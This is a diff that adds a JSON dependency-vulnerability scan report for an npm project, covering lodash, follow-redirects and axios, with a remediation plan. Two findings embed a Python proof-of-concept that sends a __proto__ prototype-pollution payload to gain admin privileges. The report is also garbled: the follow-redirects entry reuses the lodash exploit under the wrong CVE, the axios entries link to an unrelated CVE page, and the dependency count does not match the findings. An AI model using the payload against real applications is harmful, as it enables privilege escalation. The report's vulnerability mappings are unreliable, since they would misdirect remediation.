@@ -1,0 +1,141 @@
+{
+  "metadata": {
+    "scan_time": "2026-04-04T20:26:58.902211",
+    "project": "package",
+    "tool_version": "1.0.0"
+  },
+  "summary": {
+    "total_dependencies": 6,
+    "vulnerabilities": {
+      "critical": 0,
+      "high": 2,
+      "medium": 2,
+      "low": 0
+    },
+    "overall_risk_score": 60
+  },
+  "findings": [
+    {
+      "package": "follow-redirects",
+      "version": "1.10.0",
+      "ecosystem": "npm",
+      "source": "package-lock.json",
+      "transitive": true,
+      "cve": "CVE-2021-33901",
+      "severity": "high",
+      "description": "follow-redirects dependency contains prototype pollution vulnerability.",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-33901",
+      "fixed_version": "1.14.0",
+      "has_patch": true,
+      "effort": "medium",
+      "recommended_version": "1.14.0",
+      "poc": "\n# Prototype Pollution PoC - CVE-2021-23337 (lodash)\n# Vulnerable: lodash.merge() with user-controlled input\n\nimport requests\nimport json\n\ntarget = \"http://vulnerable-app.local/api/config\"\n\n# Prototype pollution payload\n# This modifies Object.prototype, affecting all objects\npayload = {\n    \"admin\": {\n        \"__proto__\": {\n            \"isAdmin\": True\n        }\n    }\n}\n\nresponse = requests.post(\n    target,\n    json=payload,\n    headers={\"Content-Type\": \"application/json\"}\n)\n\n# If vulnerable, subsequent requests will have isAdmin=true\nverify_response = requests.get(target)\ndata = verify_response.json()\n\nif data.get(\"isAdmin\"):\n    print(\"[+] Prototype Pollution successful!\")\n    print(\"[+] User now has admin privileges\")\n"
+    },
+    {
+      "package": "lodash",
+      "version": "4.17.20",
+      "ecosystem": "npm",
+      "source": "package.json",
+      "transitive": false,
+      "cve": "CVE-2021-23337",
+      "severity": "high",
+      "description": "Prototype pollution in lodash before 4.17.21.",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337",
+      "fixed_version": "4.17.21",
+      "has_patch": true,
+      "effort": "low",
+      "recommended_version": "4.17.21",
+      "poc": "\n# Prototype Pollution PoC - CVE-2021-23337 (lodash)\n# Vulnerable: lodash.merge() with user-controlled input\n\nimport requests\nimport json\n\ntarget = \"http://vulnerable-app.local/api/config\"\n\n# Prototype pollution payload\n# This modifies Object.prototype, affecting all objects\npayload = {\n    \"admin\": {\n        \"__proto__\": {\n            \"isAdmin\": True\n        }\n    }\n}\n\nresponse = requests.post(\n    target,\n    json=payload,\n    headers={\"Content-Type\": \"application/json\"}\n)\n\n# If vulnerable, subsequent requests will have isAdmin=true\nverify_response = requests.get(target)\ndata = verify_response.json()\n\nif data.get(\"isAdmin\"):\n    print(\"[+] Prototype Pollution successful!\")\n    print(\"[+] User now has admin privileges\")\n"
+    },
+    {
+      "package": "axios",
+      "version": "^0.20.0",
+      "ecosystem": "npm",
+      "source": "package.json",
+      "transitive": false,
+      "cve": "GHSA-95c9-f9f2-q643",
+      "severity": "medium",
+      "description": "Axios vulnerable to data exposure via URL parameters in server-side requests.",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+      "fixed_version": "0.21.1",
+      "has_patch": true,
+      "effort": "medium",
+      "recommended_version": "0.21.1",
+      "poc": null
+    },
+    {
+      "package": "axios",
+      "version": "0.20.0",
+      "ecosystem": "npm",
+      "source": "package-lock.json",
+      "transitive": false,
+      "cve": "GHSA-95c9-f9f2-q643",
+      "severity": "medium",
+      "description": "Axios vulnerable to data exposure via URL parameters in server-side requests.",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+      "fixed_version": "0.21.1",
+      "has_patch": true,
+      "effort": "medium",
+      "recommended_version": "0.21.1",
+      "poc": null
+    }
+  ],
+  "remediation_plan": [
+    {
+      "priority": 1,
+      "package": "follow-redirects",
+      "current_version": "1.10.0",
+      "recommended_version": "1.14.0",
+      "severity": "high",
+      "cve": "CVE-2021-33901",
+      "estimated_effort": "medium",
+      "breaking_changes": false,
+      "testing_required": [
+        "Unit tests",
+        "Integration tests"
+      ]
+    },
+    {
+      "priority": 2,
+      "package": "lodash",
+      "current_version": "4.17.20",
+      "recommended_version": "4.17.21",
+      "severity": "high",
+      "cve": "CVE-2021-23337",
+      "estimated_effort": "low",
+      "breaking_changes": false,
+      "testing_required": [
+        "Unit tests",
+        "Integration tests"
+      ]
+    },
+    {
+      "priority": 3,
+      "package": "axios",
+      "current_version": "^0.20.0",
+      "recommended_version": "0.21.1",
+      "severity": "medium",
+      "cve": "GHSA-95c9-f9f2-q643",
+      "estimated_effort": "medium",
+      "breaking_changes": false,
+      "testing_required": [
+        "Unit tests",
+        "Integration tests"
+      ]
+    },
+    {
+      "priority": 4,
+      "package": "axios",
+      "current_version": "0.20.0",
+      "recommended_version": "0.21.1",
+      "severity": "medium",
+      "cve": "GHSA-95c9-f9f2-q643",
+      "estimated_effort": "medium",
+      "breaking_changes": false,
+      "testing_required": [
+        "Unit tests",
+        "Integration tests"
+      ]
+    }
+  ]
+}
